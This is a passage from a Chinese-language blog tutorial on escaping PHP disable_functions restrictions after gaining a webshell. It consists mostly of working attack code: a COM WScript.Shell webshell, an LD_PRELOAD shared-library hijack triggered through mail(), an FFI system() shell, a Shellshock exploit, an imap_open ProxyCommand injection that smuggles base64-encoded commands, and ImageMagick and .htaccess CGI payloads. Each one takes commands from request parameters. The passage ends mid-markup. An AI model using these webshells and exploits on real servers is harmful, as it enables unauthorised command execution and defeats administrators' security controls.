class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;exec(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);<br>    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;StdOut();<br>    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;ReadAll();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&quot;Shell.Application&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Shell.Application Failed!&quot;</span>);<br>    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;ShellExecute(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c &quot;</span>.<span class="hljs-variable">$command</span>);<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_disable_function/4.png"></p><h2 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h2><h3 id="初阶"><a href="#初阶" class="headerlink" title="初阶"></a>初阶</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。<br></code></pre></td></tr></table></figure><p>总的来说就是=<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。</p><p>思路为:</p><ol><li>创建一个.so文件,linux的动态链接库文件</li><li>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</li><li>利用某个函数去触发该动态链接库</li></ol><p>这里以<code>mail()</code>函数举例。<br>在底层c语言中,<code>mail.c</code>中会调用<code>sendmail</code>，而sendmail_path使从ini文件中说明</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">; For Unix only.  <span class="hljs-function">You may supply arguments <span class="hljs-keyword">as</span> <span class="hljs-title">well</span> (<span class="hljs-params"><span class="hljs-literal">default</span>: <span class="hljs-string">&quot;sendmail -t -i&quot;</span></span>).</span> <br>;sendmail_path =<br></code></pre></td></tr></table></figure><p>默认为”sendmail -t -i”<br><img src="/img/bypass_disable_function/8.png"></p><p>但是sendmail并不是默认安装的,需要自己下载</p><p>使用命令<code>readelf -Ws /usr/sbin/sendmail</code>可以看到sendmail调用了哪些库函数,这里选择<code>geteuid</code></p><p><img src="/img/bypass_disable_function/5.png"></p><p><img src="/img/bypass_disable_function/6.png"></p><p>创建一个<code>test.c</code>文件,并定义一个<code>geteuid</code>函数,目的是劫持该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-keyword">void</span> payload() &#123;<br>    system(<span class="hljs-string">&quot;whoami &gt; /var/tmp/sd.txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">int</span> geteuid()<br>&#123;<br>    <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    payload();<br>&#125;<br></code></pre></td></tr></table></figure><p>使用gcc编译为.so文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">gcc <span class="hljs-literal">-c</span> <span class="hljs-literal">-fPIC</span> test.c <span class="hljs-literal">-o</span> test<br>gcc <span class="hljs-literal">-shared</span> test <span class="hljs-literal">-o</span> test.so<br></code></pre></td></tr></table></figure><p>这里有个坑:不要在windows上编译,编译出来是MZ头,不是ELF。</p><p>然后再上传test.so到指定目录下。</p><p>最后创建<code>shell.php</code>文件,上传到网站目录下,这里.so文件路径要写对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/test.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再理一下整个过程:当我们访问shell.php文件的时候,先会将<code>LD_PRELOAD</code>路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的<code>whoami</code>命令写入到sd.txt中。</p><p>由于拿到的webshell很有可能是<code>www-data</code>这种普通权限。<br>整个过程要注意权限问题,要可写的目录下。<br><img src="/img/bypass_disable_function/7.png"></p><p><img src="/img/bypass_disable_function/9.png"></p><p>web访问页面没有文件写出,可以看看定义的目录是否有权限。</p><h3 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h3><p>在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。</p><p>而有前辈早已指出:<a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br>细节已经说的非常明白,这里只复现,在此不再画蛇添足。</p><p>去github下载三个重要文件:<br>bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c<br>将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so传到目标有权限的目录中。<br>这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。<br><img src="/img/bypass_disable_function/10.png"></p><p>这里我已经卸载了sendmail文件<br><img src="/img/bypass_disable_function/11.png"></p><p>注意区分post和get<br><img src="/img/bypass_disable_function/12.png"></p><h2 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h2><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。<br>当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。<br>具体请参考<a href="https://www.php.net/manual/en/book.ffi.php">Foreign Function Interface</a></p><p>当前php版本为7.4.3<br><img src="/img/bypass_disable_function/14.png"></p><p>先看FFI是否开启,并且ffi.enable需要设置为true<br><img src="/img/bypass_disable_function/13.png"></p><p>使用FFI::cdef创建一个新的FFI对象<br><img src="/img/bypass_disable_function/15.png"></p><p>通过c语言的system去执行,绕过disable functions。<br>将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);       <span class="hljs-comment">//由GET传参的任意代码执行</span><br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>@unlink(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/bypass_disable_function/16.png"></p><h2 id="利用Bash-Shellshock-CVE-2014-6271-破壳漏洞"><a href="#利用Bash-Shellshock-CVE-2014-6271-破壳漏洞" class="headerlink" title="利用Bash Shellshock(CVE-2014-6271)破壳漏洞"></a>利用Bash Shellshock(CVE-2014-6271)破壳漏洞</h2><p>利用条件php &lt; 5.6.2 &amp; bash &lt;= 4.3（破壳）</p><p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><p>简单测试是否存在破壳漏洞:<br>命令行输入<code> env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞<br><img src="/img/bypass_disable_function/18.png"></p><p><a href="https://www.exploit-db.com/exploits/35146">EXP</a>如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><br><span class="hljs-comment"># Google Dork: none </span><br><span class="hljs-comment"># Date: 10/31/2014 </span><br><span class="hljs-comment"># Exploit Author: Ryan King (Starfall) </span><br><span class="hljs-comment"># Vendor Homepage: http://php.net </span><br><span class="hljs-comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><br><span class="hljs-comment"># Version: 5.* (tested on 5.6.2) </span><br><span class="hljs-comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><br><span class="hljs-comment"># CVE: CVE-2014-6271 </span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span><br>   <span class="hljs-variable">$tmp</span> = tempnam(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>); <br>   putenv(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>); <br>   <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span><br>   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span><br>   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span><br>   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="hljs-doctag">Note:</span> if this directive isempty, </span><br>   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span><br>   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span><br>   error_log(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br>   <span class="hljs-variable">$output</span> = @file_get_contents(<span class="hljs-variable">$tmp</span>); <br>   @unlink(<span class="hljs-variable">$tmp</span>); <br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span> != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>; <br>   <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> shellshock(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <br><span class="hljs-meta">?&gt;</span>     <br></code></pre></td></tr></table></figure><p>选择可上传目录路径,上传exp<br><img src="/img/bypass_disable_function/24.png"></p><p>包含文件执行<br><img src="/img/bypass_disable_function/25.png"></p><h2 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h2><p>利用条件需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code><br>在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。</p><p><img src="/img/bypass_disable_function/17.png"></p><p>基本原理为:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的<span class="hljs-built_in">exec</span> 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意<span class="hljs-built_in">shell</span>命令。<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;imap_open&#x27;</span>)) &#123; <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no imap_open function!&quot;</span>); <br>&#125; <br><span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;x -oProxyCommand=echot&quot;</span> . base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] .<br><span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&quot;|base64t-d|sh&#125;&quot;</span>; <br><span class="hljs-comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .</span><br><span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&#x27;|base64$IFS$()-d|sh&#125;&#x27;</span>; <br>imap_open(<span class="hljs-string">&#x27;&#123;&#x27;</span> . <span class="hljs-variable">$server</span> . <span class="hljs-string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// or</span><br>var_dump(<span class="hljs-string">&quot;nnError: &quot;</span>.imap_last_error()); <br>sleep(<span class="hljs-number">5</span>); <br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/cmd_result&quot;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用Pcntl组件"><a href="#利用Pcntl组件" class="headerlink" title="利用Pcntl组件"></a>利用Pcntl组件</h2><p>如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。</p><p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/pcntl_exec/exp.php">exp</a>为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#pcntl_exec().php</span><br><span class="hljs-meta">&lt;?php</span> pcntl_exec(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/tmp/b4dboy.sh&quot;</span>));<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#/tmp/b4dboy.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ls -l /<br></code></pre></td></tr></table></figure><h2 id="利用ImageMagick-漏洞绕过-CVE-2016–3714"><a href="#利用ImageMagick-漏洞绕过-CVE-2016–3714" class="headerlink" title="利用ImageMagick 漏洞绕过(CVE-2016–3714)"></a>利用ImageMagick 漏洞绕过(CVE-2016–3714)</h2><p>利用条件:</p><ul><li>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</li><li>安装了php-imagick拓展并在php.ini中启用；</li><li>编写php通过new Imagick对象的方式来处理图片等格式文件；</li><li>PHP &gt;= 5.4</li></ul><h3 id="ImageMagick介绍"><a href="#ImageMagick介绍" class="headerlink" title="ImageMagick介绍"></a>ImageMagick介绍</h3><p>ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。</p><p>产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。</p><p>据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。<br><a href="https://www.exploit-db.com/exploits/39766">EXP</a>如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . ini_get(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br>file_put_contents(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> Imagick();<br><span class="hljs-variable">$thumb</span>-&gt;readImage(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;writeImage(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;clear();<br><span class="hljs-variable">$thumb</span>-&gt;destroy();<br>unlink(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br>unlink(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>漏洞原理参考p牛文章:<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>获取和运行镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull medicean/vulapps:i_imagemagick_<span class="hljs-number">1</span><br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8000</span>:<span class="hljs-number">80</span> --name=i_imagemagick_<span class="hljs-number">1</span> medicean/vulapps:i_imagemagick_<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>访问<code>phpinfo.php</code>,发现开启了imagemagick服务<br><img src="/img/bypass_disable_function/42.png"></p><p>进入容器:<code>docker run -t -i medicean/vulapps:i_imagemagick_1  &quot;/bin/bash&quot;</code></p><p><img src="/img/bypass_disable_function/38.png"></p><p>查看<code>poc.php</code>,这其实是已经写好的poc,执行命令就是<code>ls -la</code><br><img src="/img/bypass_disable_function/39.png"></p><p>验证poc,在容器外执行<code>docker exec i_imagemagick_1 convert /poc.png 1.png</code><br><img src="/img/bypass_disable_function/40.png"></p><h2 id="利用-Apache-Mod-CGI"><a href="#利用-Apache-Mod-CGI" class="headerlink" title="利用 Apache Mod CGI"></a>利用 Apache Mod CGI</h2><p>利用条件:</p><ul><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi, rewrite</li><li>Web 目录给了 AllowOverride 权限</li></ul><h3 id="关于mod-cgi是什么"><a href="#关于mod-cgi是什么" class="headerlink" title="关于mod_cgi是什么"></a>关于mod_cgi是什么</h3><p><a href="http://httpd.apache.org/docs/current/mod/mod_cgi.html">http://httpd.apache.org/docs/current/mod/mod_cgi.html</a><br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。<br>当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>由于环境搭建困难,使用蚁剑的<a href="https://github.com/AntSwordProject/AntSword-Labs">docker</a><br><img src="/img/bypass_disable_function/21.png"></p><p>在web目录下上传<code>.htaccess</code>文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI<br>AddHandler cgi-script .<span class="hljs-keyword">ant</span><br></code></pre></td></tr></table></figure><p>上传shell.ant</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> Content-type: text/html<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span>&amp;&amp;id<br></code></pre></td></tr></table></figure><p>由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。<br><img src="/img/bypass_disable_function/22.png"></p><p>直接访问shell.xxx ,这里报错,是因为没有权限访问<br><img src="/img/bypass_disable_function/19.png"></p><p>直接使用蚁剑修改权限<br><img src="/img/bypass_disable_function/20.png"></p><p>复现成功<br><img src="/img/bypass_disable_function/23.png"></p><h2 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a>利用攻击PHP-FPM</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP-FPM</li><li>存在可写的目录, 需要上传 .so 文件</li></ul><p>关于什么是PHP-FPM,这个可以看<a href="https://www.php.cn/php-weizijiaocheng-455614.html">https://www.php.cn/php-weizijiaocheng-455614.html</a><br>关于如何攻击PHP-FPM,请看这篇<a href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p><p>蚁剑环境</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AntSwordProject/</span>AntSword-Labs.git<br>cd AntSword-Labs<span class="hljs-regexp">/bypass_disable_functions/</span><span class="hljs-number">5</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><p>连接shell后无法执行命令<br><img src="/img/bypass_disable_function/27.png"></p><p>查看phpinfo,发现目标主机配置了<code>FPM/Fastcgi</code><br><img src="/img/bypass_disable_function/26.png"></p><p>使用插件<br><img src="/img/bypass_disable_function/28.png"></p><p>要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是 127.0.0.1:9000,所以这里改为127.0.0.1：9000<br><img src="/img/bypass_disable_function/29.png"></p><p>但是这里我死活利用不了<br><img src="/img/bypass_disable_function/30.png"></p><p>这里换了几个版本还是不行，但看网上师傅利用是没问题的<br>有感兴趣想复现师傅看这里:<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5</a></p><h2 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a>利用 GC UAF</h2><p>利用条件</p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">EXP</a><br><a 